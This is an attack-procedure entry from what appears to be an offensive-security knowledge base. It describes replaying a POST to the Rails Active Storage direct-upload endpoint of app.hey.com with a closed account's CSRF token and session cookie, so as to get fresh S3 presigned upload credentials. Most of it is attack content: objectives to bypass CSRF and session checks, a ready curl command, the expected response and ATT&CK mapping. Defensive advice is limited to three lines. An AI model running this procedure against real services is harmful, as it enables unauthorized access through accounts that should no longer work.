---
id: proc-uuid-3
tags:
  - request-replay
  - csrf-bypass
  - active-storage
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/initiate-active-storage-upload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T05:32:13.710Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Replay-Modified-POST-for-Upload-Initiation

## Summary

This procedure replays a modified POST request to /rails/active_storage/direct_uploads using closed account tokens, generating new S3 presigned credentials despite authentication failure.

## Description

Exploiting the lack of account status validation in Rails Active Storage, this replays the upload initiation with updated CSRF and session data. It targets the endpoint that returns signed S3 URLs, allowing progression to direct upload without active authentication.

## Requirements

1. Captured original POST request
2. Extracted CSRF token and cookie from closed login
3. Burp Repeater for modification and sending

## Defense

Defensive measures and detection strategies:

- Validate user account status in every Active Storage request
- Rate-limit upload initiations per session
- Monitor for mismatched session ages and account states

## Objectives

1. Obtain fresh S3 upload URL and headers
2. Bypass CSRF and session checks
3. Enable direct S3 access for closed users

## Instructions

### Step 1: Update Request Headers

**Context**: Inject closed account artifacts.

Add X-CSRF-Token header and replace Cookie in the POST request.

### Step 2: Send Modified POST

**Context**: Initiate upload to get credentials.

Execute [[commands/initiate-active-storage-upload]] in Burp Repeater:

```bash
# Simulated curl equivalent for the POST
curl -X POST https://app.hey.com/rails/active_storage/direct_uploads \
  -H "X-CSRF-Token: <extracted_token>" \
  -H "Cookie: <closed_session_cookie>" \
  -H "Content-Type: application/json" \
  -d '{"blob":{"filename":"test.svg","content_type":"image/svg+xml","byte_size":338,"checksum":"<base64_md5>"}}'
```

> This sends blob metadata; expect JSON with signed_id and direct_upload details including S3 URL and AWS headers.

**Expected Output**: {"signed_id":"abc123","direct_upload":{"url":"https://s3...","headers":{"X-Amz-Signature":"..."}}}

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/initiate-active-storage-upload]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- request-replay
- csrf-bypass
- active-storage
